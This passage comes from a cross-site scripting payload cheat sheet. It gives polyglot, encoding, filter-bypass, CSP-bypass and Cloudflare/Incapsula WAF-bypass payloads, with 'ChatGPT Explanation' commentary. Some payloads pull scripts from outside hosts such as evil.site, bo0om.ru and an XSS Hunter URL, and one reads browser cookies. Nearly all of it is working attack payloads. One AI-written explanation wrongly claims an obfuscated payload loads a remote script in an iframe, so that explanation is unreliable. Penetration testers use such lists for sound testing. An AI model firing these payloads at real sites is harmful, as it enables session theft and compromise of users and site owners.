javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

# by europa
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

# by EdOverflow
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

# by h1/ragnar
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
```

Polyglot XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)
```javascript
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

## Filter Bypass and exotic payloads

### Bypass case sensitive

```javascript
<sCrIpt>alert(1)</ScRipt>
```

### Bypass tag blacklist

```javascript
<script x>
<script x>alert('XSS')<script y>
```

### Bypass word blacklist with code evaluation

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

### Bypass with incomplete html tag

Works on IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror='alert(0)' <
```

### Bypass quotes for string

```javascript
String.fromCharCode(88,83,83)
```

### Bypass quotes in script tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

### Bypass quotes in mousedown event

You can bypass a single quote with &#39; in an on mousedown event handler

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

### Bypass dot filter

```javascript
<script>window['alert'](document['domain'])</script>
```

Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
http://www.geektools.com/cgi-bin/ipconv.cgi

```javascript
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

### Bypass parenthesis for string

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

### Bypass parenthesis and semi colon

```javascript
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

### Bypass onxxxx= blacklist

```javascript
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>

// Bypass onxxx= filter with a null byte/vertical tab
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />

// Bypass onxxx= filter with a '/'
<img src='1' onerror/=alert(0) />
```

### Bypass space filter

```javascript
// Bypass space filter with "/"
<img/src='1'/onerror=alert(0)>

// Bypass space filter with 0x0c/^L
<svgonload=alert(1)>

$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

### Bypass email filter

([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))

```javascript
"><svg/onload=confirm(1)>"@x.y
```

### Bypass document blacklist

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

### Bypass document.cookie blacklist

This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.

```
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```
**ChatGPT Explation:**  
This JavaScript code attempts to perform a Cross-Site Scripting (XSS) attack by using the window.cookieStore API to access the value of a cookie with a specific name "COOKIE NAME" and display an alert box with the value of the cookie using the alert() function.

The window.cookieStore API is a feature available in web browsers that allows JavaScript code to access and manipulate the cookies of a website. The API provides methods to get, set and delete cookies, and the get() method is used in the code to retrieve the cookie value with the name "COOKIE NAME".

The get() method returns a promise that resolves with a Cookie object containing the value, name, and other properties of the cookie. In this case, the code uses the then() method to handle the promise and a callback function to extract the value property of the Cookie object.

The alert() function is used to display a message box with the value of the cookie, which is passed as an argument.

---

### Bypass using javascript inside a string

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

### Bypass using an alternate way to redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

### Bypass using an alternate way to execute an alert

From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables

The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

Then calling alert is :

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

We can find "alert" with a regular expression like ^a[rel]+t$ :

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()

// then you can use a() with Object.keys

self[Object.keys(self)[a()]]("1") // alert("1")
```

Oneliner:
```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

From [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

Bypass using an alternate way to trigger an alert

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

### Bypass ">" using nothing

You don't need to close your tags.

```javascript
<svg onload=alert(1)//
```

### Bypass "<" and ">" using ＜ and ＞

Unicode Character U+FF1C and U+FF1E

```javascript
＜script/src=//evil.site/poc.js＞
```

### Bypass ";" using another character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

### Bypass using HTML encoding

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

### Bypass using Katana

Using the [Katakana](https://github.com/aemkei/katakana.js) library.

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

### Bypass using Cuneiform

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

### Bypass using Lontara

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

More alphabets on http://aem1k.com/aurebesh.js/#

### Bypass using ECMAScript6

```html
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

### Bypass using Octal encoding

```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

### Bypass using Unicode

```javascript
Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')

E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
%EF%BC%9E becomes >
%EF%BC%9C becomes <
```

Bypass using Unicode converted to uppercase

```javascript
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k

<ſvg onload=... > become <SVG ONLOAD=...>
<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
```

### Bypass using UTF-7

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

### Bypass using UTF-8

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

### Bypass using UTF-16be

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

### Bypass using UTF-32

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

### Bypass using BOM

Byte Order Mark (The page must begin with the BOM character.)
BOM character allows you to override charset of the page

```js
BOM Character for UTF-16 Encoding:
Big Endian : 0xFE 0xFF
Little Endian : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

BOM Character for UTF-32 Encoding:
Big Endian : 0x00 0x00 0xFE 0xFF
Little Endian : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

### Bypass using weird encoding or native interpretation

```javascript
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```
**ChatGPT Explanation:**  
This is a malicious script that uses several different methods to try to execute a JavaScript alert function with the parameter of "1". Some of the methods include using a script tag, an image tag with an onerror event, an iframe with a javascript: URL, and a string of characters that are meant to be evaluated as JavaScript. The script also assigns a value to multiple variables using various properties and methods of JavaScript, however the purpose of these assignments is not clear. The script is attempting to execute the alert function which is a common method used in XSS attacks to pop-up a browser dialogue box, it could be used to steal sensitive information from the victim or redirect the victim to a phishing site.

Here is a breakdown of what the payload is doing:

1. The payload creates an object with properties that are set to the values of various properties and methods of JavaScript, and assigns it to the variable $.
2. The payload uses the value of the `$` object to generate a string, which is then passed to the $() function.
3. The $() function is used to execute the generated string, which is a script that creates an iframe and appends it to the current page.
4. The iframe then loads a script from a remote server, which can potentially be used to exfiltrate sensitive data or perform other malicious actions.
5. The payload also uses various techniques to evade detection, such as character encoding and obfuscation.

---

### Bypass using jsfuck

Bypass using [jsfuck](http://www.jsfuck.com/)

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```
**ChatGPT Explanation:**  
Here are the steps this payload takes to execute an alert box:
1. The payload uses a combination of characters like `[][(![]+[])[+[]]` which are used to construct an array and a function to call that array.
2. It uses a combination of +, !, and [] to create a string containing the characters "alert" and then uses the eval function to execute it.
3. The payload also uses newline characters, and ; to evade detection.
---

## CSP Bypass

Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)

### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))

//google.com/complete/search?client=chrome&jsonp=alert(1);

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

More JSONP endpoints:
* [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)

```js
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
**ChatGPT Explanation:**  
1. `script=document.createElement('script');` : this line creates a new script element.
2. `script.src='//bo0om.ru/csp.js';` : this line sets the source of the script to "//bo0om.ru/csp.js"
3. `window.frames[0].document.head.appendChild(script);` : this line appends the script element to the head of the first frame in the window.frames array.

This script can be used for malicious purposes, such as injecting malicious code into a website, bypassing Content Security Policy (CSP), and performing a Cross-site scripting (XSS) attack. It is important to note that, this script can be used to load an external script from 'bo0om.ru', this script can contain any code and execute it on the user's browser.

---

### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

```js
// CSP Bypass with Inline and Eval
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```
**ChatGPT Explanation:**  
This is a JavaScript code that creates an iframe, sets its src attribute to the href of the first link element that has a .css in its href attribute, appends the iframe to the body of the current document, then creates a script element and sets its src attribute to a specific URL. It then waits for 1 second and then appends the script element to the head of the iframe.

The code contains the following elements:
1. `d=document;` : this line assigns the current document to the variable d.
2. `f=d.createElement("iframe");` : this line creates an iframe element and assigns it to the variable f.
3. `f.src=d.querySelector('link[href*=".css"]').href;` : this line sets the src attribute of the iframe element to the href of the first link element that has a .css in its href attribute.
4. `d.body.append(f);` : this line appends the iframe element to the body of the current document
5. `s=d.createElement("script");` : this line creates a script element and assigns it to the variable s.
6. `s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";` : this line sets the src attribute of the script element to a specific URL
7. `setTimeout(function(){f.contentWindow.document.head.append(s);},1000)` : this line waits for 1 second and then appends the script element to the head of the iframe.

### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)

Works for CSP like `script-src self`

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)

Works for CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).

```javascript
<script src="data:,alert(1)">/</script>
```


## Common WAF Bypass

### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

#### 25st January 2021

```html
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
```

#### 21st April 2020

```html
<svg/OnLoad="`${prompt``}`">
```

#### 22nd August 2019

```html
<svg/onload=%26nbsp;alert`bohdan`+
```

#### 5th June 2019

```html
1'"><img/src/onerror=.1|alert``>
```

#### 3rd June 2019

```html
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

### Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)

```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```
**ChatGPT Explanation:**  
1. `<svg/` : This is an opening tag for the HTML `<svg>` element and it is malformed as it has no closing tag.
2. `onload=` : This is an event handler attribute which triggers the code when the svg element is loaded by the browser.
3. `&#97&#108&#101&#114&#00116&#40&#41`: This is a series of encoded characters that represent the word "alert" and the parentheses "()" which are used to create a JavaScript function call.
4. `&#x2f&#x2f` : This is a series of encoded characters that represent the characters "//", this is used to create a JavaScript comment, and comments are used to prevent the browser from executing the rest of the code.

When rendered by a browser, this string will create a malformed HTML code, which will look like: `<svg/onload=alert()//`. This malformed code will execute the script when the svg element is loaded by the browser, which will pop-up an alert box. However, due to the // at the end, it will not execute any further code.

---

### Cloudflare XSS Bypass - 27th February 2018

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```
**ChatGPT Explanation:**  
1. `<a href="` : This is an opening tag for the HTML `<a>` (anchor) element and the attribute href which sets the URL of the link.
2. `j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;` : This is a malformed version of the word "javascript" that is separated by tab and newline characters.
3. `&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">`: This is a JavaScript code that is executed when the link is clicked, the code alert(document.domain) will show an alert box with the current domain of the page.
4. `X</a>` : This is a closing tag for the HTML `<a>` element.

When rendered by a browser, this string will create a malformed HTML code, which will look like:
```html
<a href="j
a
v
asc
ri
pt:alert(document.domain)">X</a>
```
This malformed code will execute the script when the link is clicked, which will pop-up an alert box with the current domain of the page.

---

### Chrome Auditor - 9th August 2018

```javascript
</script><svg><script>alert(1)-%26apos%3B
```

Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)

### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th March 2018

```javascript
anythinglr00</script><script>alert(document.domain)</script>uxldz

